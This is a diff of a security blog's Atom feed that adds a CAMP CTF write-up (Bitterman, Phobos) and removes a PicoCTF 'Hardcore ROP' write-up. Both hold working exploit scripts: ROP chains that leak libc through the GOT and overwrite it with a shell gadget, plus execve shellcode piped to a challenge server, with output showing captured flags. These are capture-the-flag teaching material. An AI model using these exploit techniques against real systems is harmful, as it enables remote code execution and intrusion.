@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Rop | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/rop/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-07-25T22:02:43+02:00</updated>
+  <updated>2015-08-18T21:42:50+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,283 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Bitterman &amp; Phobos]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos/"/>
+    <updated>2015-08-18T21:32:18+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos</id>
+    <content type="html"><![CDATA[<p>I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we&rsquo;re presented with the following:</p>
+
+<pre><code class="bash">&gt; What's your name? 
+BBBB
+Hi, BBBB
+x
+&gt; Please input the length of your message: 
+-1  
+&gt; Please enter your text: 
+LSJFLSDJF
+&gt; Thanks!
+</code></pre>
+
+<p>The <code>x</code> after the <code>BBBB</code> in the above example was actually <code>0x7f</code>, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn&rsquo;t make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it&rsquo;s ROP time!</p>
+
+<p>Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc&rsquo;s base address and then something like <code>system()</code>. I made use of the <code>puts@plt</code> to write out the contents of <code>puts@got</code>. The latter contains the libc address of <code>puts()</code>, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to <code>read@plt</code> and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites <code>puts@got</code> and restarts the binary from <code>main()</code>. This latter decision was based on using <code>system()</code> instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When <code>main()</code> restarts, one of the first functions it calls is <code>puts@plt</code>, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+payload = "A"*152   # ty Swappage!
+
+'''
+0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
+0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+0x00000060 : pop rbp; ret
+'''
+
+base = 0x400590
+# prologue, needed for later! after the [call r12 + rbx*8], there is
+# a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, 
+# the code jumps back instead of leading to a ret!
+# therefore, we set up rbp first. 
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+# first, we set up some registers, which will later be put in the correct registers
+# puts() uses rdi as argument
+payload += q(0x000002bc+base)
+payload += q(0x600c50)  # value for r12 -&gt; puts@got
+payload += q(0)         # value for r13 -&gt; goes into rdx 
+payload += q(0)         # value for r14 -&gt; goes into rsi
+payload += q(0x600c50)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()
+
+# swap around the registers and call puts()
+payload += q(0x00000296+base)
+payload += q(0) * 7
+# without this, we don't get output
+payload += q(0x400570)  # fflush@plt
+
+# now read() to overwrite printf()
+# read() is blocking and will wait for our input :)
+# again, first set up rbp
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+# set up registers/arguments for read()
+payload += q(0x000002bc+base)
+payload += q(0x600c60)  # value for r12 -&gt; read@got
+payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
+payload += q(0x600c50)  # value for r14 -&gt; goes into rsi -&gt; overwrite puts@got
+payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin
+
+payload += q(0x00000296+base)
+payload += q(0) * 7
+
+# restart main(), so the binary will execute puts() -&gt; one shot rce, lands a shell
+# could've just a easily return to puts@plt...
+payload += q(0x4006ec) 
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10103))
+
+    readtil('name?')
+    s.send('a\n')
+    readtil('message:')
+    s.send('-1\n')   # ty Swappage!
+    readtil('text:')
+    s.send(payload+'\n')
+
+    readtil('Thanks!\n')
+    data = s.recv(8)
+    data = data[:-1] + "\x00\x00"
+    puts_addr = struct.unpack('&lt;Q', data)[0]
+    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
+
+    libc_base = puts_addr - 0x70a30
+    print "[+] libc base addr: " + hex(libc_base)
+    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
+    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
+
+    # the rop chain will wait at read(), because that is blocking
+    # send the address to overwrite puts@got
+    s.send(q(system_addr))
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+pwn()
+</code></pre>
+
+<p>The reason for setting up <code>rbp</code>:</p>
+
+<pre><code>  400839:   call   QWORD PTR [r12+rbx*8]
+  40083d:   add    rbx,0x1
+  400841:   cmp    rbx,rbp  ; if rbx != rbp, we jump back!
+  400844:   jne    400830 
+  400846:   add    rsp,0x8  ; we wanna go here!
+  40084a:   pop    rbx
+  40084b:   pop    rbp
+  40084c:   pop    r12
+  40084e:   pop    r13
+  400850:   pop    r14
+  400852:   pop    r15
+  400854:   ret    
+</code></pre>
+
+<p>And the exploit in action:</p>
+
+<pre><code class="bash">[+] Leaked puts(): 0x7fb9d6487a30
+[+] libc base addr: 0x7fb9d6417000
+[+] sending one shot rce addr (0x7fb9d645b2aa)
+id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+whoami
+challenge
+ls -alh
+total 40K
+drwxr-xr-x 2 root root 4.0K Aug 13 13:46 .
+drwxr-xr-x 3 root root 4.0K Aug  5 21:43 ..
+-rw-r--r-- 1 root root  220 Aug  5 19:55 .bash_logout
+-rw-r--r-- 1 root root 3.7K Aug  5 19:55 .bashrc
+-rw-r--r-- 1 root root  675 Aug  5 19:55 .profile
+-rwxr-xr-x 1 root root  11K Aug 12 01:28 bitterman
+-rw-r--r-- 1 root root   43 Aug 13 13:47 flag.txt
+-rwxr-xr-x 1 root root   64 Aug 12 01:34 run.sh
+cat flag.txt
+CAMP15_a786be6aca70bfd19b6af86133991f80  -
+</code></pre>
+
+<h2>Phobos</h2>
+
+<p>Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+payload = "A"*136   # ty Swappage!
+
+'''
+0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
+0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
+0x00000060 : pop rbp; ret
+'''
+
+base = 0x400590
+# prologue, needed for later!
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+payload += q(0x000002dc+base)
+payload += q(0x600c70)  # value for r12 -&gt; puts@got
+payload += q(0)         # value for r13 -&gt; goes into rdx 
+payload += q(0)         # value for r14 -&gt; goes into rsi
+payload += q(0x600c70)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()
+
+payload += q(0x000002b6+base)
+payload += q(0) * 7
+payload += q(0x400570)  # fflush@plt
+
+# now read() to overwrite printf()
+payload += q(0x00000060+base)   # pop rbp ; ret
+payload += q(1) # value for rbp
+
+payload += q(0x000002dc+base)
+payload += q(0x600c80)  # value for r12 -&gt; read@got
+payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
+payload += q(0x600c70)  # value for r14 -&gt; goes into rsi -&gt; overwrite printf()
+payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin
+
+payload += q(0x000002b6+base)
+payload += q(0) * 7
+
+payload += q(0x4006ec) # restart, so the binary will execute puts() -&gt; one shot rce, lands a shell
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10106))
+    #s.connect(('localhost', 4444))
+
+    print readtil('name?')
+    s.send('a\n')
+    print readtil('message:')
+    s.send('-1\n')   # ty Swappage!
+    print readtil('text:')
+    s.send(payload+'\n')
+    print readtil('Thanks!\n')
+
+    data = s.recv(8)
+    data = data[:-1] + "\x00\x00"
+
+    puts_addr = struct.unpack('&lt;Q', data)[0]
+    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
+    libc_base = puts_addr - 0x70a30
+    print "[+] libc base addr: " + hex(libc_base)
+    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
+    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
+
+    s.send(q(system_addr))
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+pwn()
+</code></pre>
+
+<p>And in action:</p>
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/phobos$ python poc2.py 
+&gt; What's your name?
+
+Hi, a
+&lt;randomjunk&gt;
+&gt; Please input the length of your message:
+
+&gt; Please enter your text:
+
+&gt; Thanks!
+
+[+] Leaked puts(): 0x7fa6830dda30
+[+] libc base addr: 0x7fa68306d000
+[+] sending one shot rce addr (0x7fa6830b12aa)
+id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+cat flag.txt
+CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
+</code></pre>
+
+<p>It&rsquo;s quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[ROP Primer - Level0]]></title>
@@ -1748,274 +2025,6 @@ db "/bin/sh", 0
 <p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>
 
 <p>Until the next #maximumoverkill :]</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PicoCTF - Hardcore ROP]]></title>
-    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop/"/>
-    <updated>2014-11-06T23:48:56+01:00</updated>
-    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop</id>
-    <content type="html"><![CDATA[<p>Our team, <a href="https://ctf-team.vulnhub.com">vulnhub-ctf</a>, joined <code>picoctf</code> to improve our skills and learn a thing or two. There were many challenges, among which a few &ldquo;Master Challenges&rdquo; worth 200 points. This is a story of how we tackled <code>hardcore_rop</code>. The challenge promises ASLR, NX, PIE and what-have-you, so let&rsquo;s get cracking!</p>
-
-<!--more-->
-
-
-<p>Upon inspecting the source of code of this weird program, we see the following:</p>
-
-<pre><code class="c">void randop() {
-    munmap((void*)0x0F000000, MAPLEN);
-    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
-    unsigned seed;
-    if(read(0, &amp;seed, 4) != 4) return;
-    srand(seed);
-    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
-        *(int *)&amp;((char*)buf)[i] = rand();
-        if(i%66 == 0) ((char*)buf)[i] = 0xc3;
-    }
-    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
-    puts("ROP time!");
-    fflush(stdout);
-    size_t x, count = 0;
-    do x = read(0, ((char*)&amp;seed)+count, 555-count);
-    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
-}
-
-int main(int argc, char *argv[]) {
-    struct stat st;
-    if(argc != 2 || chdir(argv[1]) != 0 || stat("./flag", &amp;st) != 0) {
-        puts("oops, problem set up wrong D:");
-        fflush(stdout);
-        return 1;
-    } else {
-        puts("yo, what's up?");
-        alarm(30); sleep(1);
-        randop();
-        fflush(stdout);
-        return 0;
-    }
-}
-</code></pre>
-
-<p>The <code>randop()</code> function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:</p>
-
-<pre><code class="c">    munmap((void*)0x0F000000, MAPLEN);
-    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
-    unsigned seed;
-    if(read(0, &amp;seed, 4) != 4) return;
-    srand(seed);
-    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
-        *(int *)&amp;((char*)buf)[i] = rand();
-        if(i%66 == 0) ((char*)buf)[i] = 0xc3;  
-    }
-    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
-</code></pre>
-
-<p>The memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can &ldquo;choose&rdquo; which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:</p>
-
-<pre><code class="c">    size_t x, count = 0;
-    do x = read(0, ((char*)&amp;seed)+count, 555-count);
-    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
-</code></pre>
-
-<p>This function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let&rsquo;s enable coredumps and get control of EIP.</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (echo 7777; python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"') | ./hardcore_rop `pwd`
-yo, what's up?
-ROP time!
-Segmentation fault (core dumped)
-bas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core
-GNU gdb (GDB) 7.4.1-debian
-...
-Core was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop'.
-Program terminated with signal 11, Segmentation fault.
-#0  0x42424242 in ?? ()
-</code></pre>
-
-<p>Excellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can&rsquo;t write into the region at <code>0xf000000</code> because it isn&rsquo;t writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at <code>0xf000000</code> are always at the same location. We need to find enough ROP gadgets to make the region at <code>0xf000000</code> writeable, so that we can store shellcode there and execute it.</p>
-
-<p>For this to work, we need two things: control over registers and an <code>int 0x80</code> instruction, to execute syscalls. The region at <code>0xf000000</code> contains 40960 bytes, filled with random ROP gadgets. There could be an <code>int 0x80; ret;</code> in there. The chances are slim, but there&rsquo;s a chance nonetheless. I scripted the search for ROP gadgets with the following:</p>
-
-<pre><code class="bash">#!/bin/bash
-
-while read i; do
-    (echo $i; echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB") | ./hardcore_rop `pwd`
-    dd if=core of=region bs=1 skip=4096 count=40960
-    xxd -c 1 region | awk {'print $1 $2'} |sort -r &gt; dump.txt
-    python ./ropgadget.py -i bleh -d 10 &gt; $i-gadgets.txt
-
-    cat $i-gadgets.txt |egrep 'int 0x80'
-    rm core
-    rm dump.txt
-done &lt; digits.txt
-</code></pre>
-
-<p>This script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at <code>0xf000000</code> and proceeds to dump all these bytes into a textfile. Finally, my custom <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">ropgadget.py</a> searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ grep "int 0x80" *
-0347-gadgets.txt:RET: 0x0000d64: int 0x80; lahf; ret; 
-</code></pre>
-
-<p>It found an <code>int 0x80</code> gadget! Luckily, the opcode <code>lahf</code> is harmless: it just load the FLAGS into <code>ah</code>. No big deal! With this useable gadget, a ROP chain could be built that calls <code>mprotect</code> to set the region at <code>0xf000000</code> to writeable. After this stage 1, a second stage would read the shellcode. First things first, let&rsquo;s find gadgets that allow us to control registers. The easiest would be a <code>pop r32; ret</code>. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:</p>
-
-<pre><code># RET: 0x000913f: pop eax; ret;
-# RET: 0x0003c7e: pop ecx; ret;
-# RET: 0x0002393: pop edx; ret;
-# RET: 0x000964d: pop ebx; ret;
-# RET: 0x0000d64: int 0x80; lahf; ret;
-</code></pre>
-
-<p>I wrote the following ROP chain:</p>
-
-<pre><code class="python">#!/usr/bin/python
-
-import struct
-
-BASE = 0xf000000
-# RET: 0x000913f: pop eax; ret;
-popeax = 0x000913f
-# RET: 0x0003c7e: pop ecx; ret;
-popecx = 0x0003c7e
-# RET: 0x0002393: pop edx; ret;
-popedx = 0x0002393
-# RET: 0x000964d: pop ebx; ret;
-popebx = 0x000964d
-# RET: 0x0000569: pop edi; ret;
-popedi = 0x0000569
-# RET: 0x0000d64: int 0x80; lahf; ret;
-int80h = 0x0000d64
-# RET: 0x0001b11: int3; ret;
-int03h = 0x0001b11
-
-def p(x):
-    return struct.pack("&lt;L", x)
-
-payload = ""
-
-# seed value
-payload += "0347\n"
-
-# overflow buffer
-payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-
-# syscall number 125 in eax (mprotect)
-payload += p(BASE + popeax)
-payload += p(125)
-
-# pointer to memory region in ebx
-payload += p(BASE + popebx)
-payload += p(BASE)
-
-# memory flags PROT_READ | PROT_WRITE | PROT_EXEC
-payload += p(BASE + popedx)
-payload += p(7)
-
-# length in ecx, needs to be multiple of 2
-payload += p(BASE + popecx)
-payload += p(0x1000)
-
-# call syscall int 0x80
-payload += p(BASE + int80h)
-
-# stage2 test
-# edi = 0xf000000
-payload += p(BASE + popedi)
-payload += p(BASE)
-# edx = 0xcccccccc (four times int 0x3)
-payload += p(BASE + popedx)
-payload += p(0xcccccccc)
-# RET: 0x0002770: mov [edi], dh; ret
-payload += p(BASE + 0x0002770)
-# return to 0xf000000, which should contain an int 0x3
-payload += p(BASE + popedx + 1)
-payload += p(BASE)
-
-print payload
-## Usage: $ python ropsploit.py | ./hardcore_rop `pwd`
-</code></pre>
-
-<p>After running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with <code>gdb</code> showed that the first byte of <code>0xf000000</code> was a <code>0xcc</code>, so this worked!</p>
-
-<p>Writing the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use <code>syscall_read</code>. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:</p>
-
-<pre><code class="python">#!/usr/bin/python
-
-import time, struct
-
-BASE = 0xf000000
-popeax = 0x000913f
-popecx = 0x0003c7e
-popedx = 0x0002393
-popebx = 0x000964d
-popedi = 0x0000569
-int80h = 0x0000d64
-int03h = 0x0001b11
-
-def p(x):
-    return struct.pack("&lt;L", x)
-
-payload = ""
-
-# seed value
-payload += "0347\n"
-
-# overflow buffer
-payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-
-# eax = syscall_mprotect
-payload += p(BASE + popeax)
-payload += p(125)
-# pointer to memory region in ebx
-payload += p(BASE + popebx)
-payload += p(BASE)
-# memory flags PROT_READ | PROT_WRITE | PROT_EXEC
-payload += p(BASE + popedx)
-payload += p(7)
-# length in ecx, needs to be multiple of 2
-payload += p(BASE + popecx)
-payload += p(0x1000)
-# call syscall int 0x80
-payload += p(BASE + int80h)
-
-# eax = syscall_read
-payload += p(BASE + popeax)
-payload += p(3)
-# ecx = ptr to BASE
-payload += p(BASE + popecx)
-payload += p(BASE)
-# ebx = fd = stdin
-payload += p(BASE + popebx)
-payload += p(0)
-# edx = size of shellcode (set to 100)
-payload += p(BASE + popedx)
-payload += p(100)
-# call syscall int 0x80
-payload += p(BASE + int80h)
-
-# return to 0xf000000
-payload += p(BASE + popedx + 1)
-payload += p(BASE)
-
-print payload
-time.sleep(3)
-</code></pre>
-
-<p>Now, this was used with <a href="http://shell-storm.org/shellcode/files/shellcode-547.php">a slightly modified shellcode</a>. This shellcode uses <code>execve</code> to run <code>/bin/ash</code>; I changed it to run <code>/bin//sh</code>. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from <code>ropsploit.py</code>. The following landed us a shell on the remote server (again, using <code>cat</code> to keep the shell alive):</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (python ropsploit.py; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'; cat) | nc vuln2014.picoctf.com 4000
-yo, what's up?
-ROP time!
-ls -al
-total 24
-drwxr-xr-x    2 root     root          4096 Oct 28 17:55 .
-drwxr-xr-x    3 root     root          4096 Oct  5 17:33 ..
--rw-r--r--    1 root     root            21 Oct  5 17:44 flag
--rwxr-xr-x    1 root     root         11266 Oct  6 01:13 hardcore_rop
-cat flag
-hard_as_PIE_amirite?
-</code></pre>
-
-<p>And there&rsquo;s the flag! A very fun challenge!</p>
 ]]></content>
   </entry>
   
